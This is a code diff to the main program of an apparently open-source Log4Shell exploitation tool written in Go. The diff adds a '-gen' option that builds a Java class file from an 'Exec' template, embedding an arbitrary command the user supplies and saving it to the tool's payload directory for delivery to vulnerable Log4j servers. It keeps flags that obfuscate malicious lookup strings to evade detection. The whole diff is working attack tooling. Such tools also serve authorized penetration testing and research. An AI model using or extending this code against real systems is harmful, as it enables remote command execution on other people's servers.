@@ -8,6 +8,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"path/filepath"
 
 	"github.com/For-ACGN/Log4Shell"
 )
@@ -16,9 +17,11 @@ var (
 	config   log4shell.Config
 	certFile string
 	keyFile  string
-	rawStr   string
+	obfRaw   string
 	noToken  bool
 	hide     bool
+	genClass string
+	genArgs  string
 )
 
 func init() {
@@ -35,9 +38,11 @@ func init() {
 	flag.BoolVar(&config.EnableTLS, "tls-server", false, "enable ldaps and https server")
 	flag.StringVar(&certFile, "tls-cert", "cert.pem", "tls certificate file path")
 	flag.StringVar(&keyFile, "tls-key", "key.pem", "tls private key file path")
-	flag.StringVar(&rawStr, "obf", "", "obfuscate malicious(payload) string")
+	flag.StringVar(&obfRaw, "obf", "", "obfuscate malicious(payload) string")
 	flag.BoolVar(&noToken, "no-token", false, "not add random token when use obfuscate")
 	flag.BoolVar(&hide, "hide", false, "hide obfuscated malicious(payload) string in log4j2")
+	flag.StringVar(&genClass, "gen", "", "generate Java class file with template name")
+	flag.StringVar(&genArgs, "args", "", "arguments about generate Java class file")
 	flag.Parse()
 }
 
@@ -56,9 +61,12 @@ func banner() {
 }
 
 func main() {
-	// output obfuscated string
-	if rawStr != "" {
+	switch {
+	case obfRaw != "":
 		obfuscate()
+		return
+	case genClass != "":
+		generateClass()
 		return
 	}
 
@@ -105,13 +113,13 @@ func obfuscate() {
 		rawWithToken string
 	)
 	if hide {
-		obfuscated, rawWithToken = log4shell.ObfuscateWithDollar(rawStr, !noToken)
+		obfuscated, rawWithToken = log4shell.ObfuscateWithDollar(obfRaw, !noToken)
 	} else {
-		obfuscated, rawWithToken = log4shell.Obfuscate(rawStr, !noToken)
+		obfuscated, rawWithToken = log4shell.Obfuscate(obfRaw, !noToken)
 	}
 	var raw string
 	if noToken {
-		raw = rawStr
+		raw = obfRaw
 	} else {
 		raw = rawWithToken
 	}
@@ -122,6 +130,41 @@ func obfuscate() {
 	}
 	const notice = "\nEach string can only be used once, or wait %d seconds.\n"
 	fmt.Printf(notice, log4shell.TokenExpireTime)
+}
+
+func generateClass() {
+	switch genClass {
+	case "exec":
+		template, err := os.ReadFile("template/Exec.class")
+		checkError(err)
+
+		args := flag.NewFlagSet("Execute", flag.ExitOnError)
+		args.SetOutput(os.Stdout)
+		var (
+			command string
+			class   string
+			output  string
+		)
+		args.StringVar(&command, "cmd", "", "the executed command")
+		args.StringVar(&class, "class", "Exec", "the new class name")
+		args.StringVar(&output, "output", "", "output class file path")
+		_ = args.Parse(log4shell.CommandLineToArgs(genArgs))
+
+		if command == "" {
+			args.PrintDefaults()
+			return
+		}
+		if output == "" {
+			output = filepath.Join(config.PayloadDir, class+".class")
+		}
+		data, err := log4shell.GenerateExecuteClass(template, command, class)
+		checkError(err)
+		err = os.WriteFile(output, data, 0600)
+		checkError(err)
+		fmt.Println("Save generated class file to the path:", output)
+	default:
+		log.Fatalf("[error] unknown class template name: \"%s\"\n", genClass)
+	}
 }
 
 func checkError(err error) {
